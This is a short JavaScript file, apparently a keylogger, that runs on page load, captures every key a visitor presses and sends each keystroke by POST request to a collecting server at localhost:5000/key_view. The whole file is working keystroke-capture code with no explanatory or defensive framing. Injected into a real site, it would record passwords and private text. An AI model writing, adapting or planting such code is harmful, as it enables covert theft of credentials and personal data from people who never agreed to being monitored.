

addEventListener("DOMContentLoaded", function(){

    addEventListener('keydown',
        event => {
            var pressed_key = event.key;
            
            var formData = new FormData();
            formData.append('key', pressed_key);
            
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "http://localhost:5000/key_view");
            xhr.send(formData);
        }
    );
});